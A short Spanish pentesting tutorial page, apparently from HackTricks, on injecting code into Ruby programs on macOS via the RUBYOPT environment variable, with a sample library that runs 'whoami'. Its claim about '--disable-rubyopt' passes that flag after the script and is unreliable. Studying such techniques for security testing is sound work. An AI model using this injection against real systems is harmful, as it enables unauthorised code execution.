# Inyección de Aplicaciones Ruby en macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Usando esta variable de entorno es posible **agregar nuevos parámetros** a **ruby** cada vez que se ejecuta. Aunque el parámetro **`-e`** no se puede usar para especificar código ruby a ejecutar, es posible usar los parámetros **`-I`** y **`-r`** para agregar una nueva carpeta a la ruta de carga de bibliotecas y luego **especificar una biblioteca para cargar**.

Crea la biblioteca **`inject.rb`** en **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Crea un script de ruby en cualquier lugar como:
```ruby:hello.rb
puts 'Hello, World!'
```
Luego, haz que un script de ruby arbitrario lo cargue con:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Dato curioso, funciona incluso con el parámetro **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
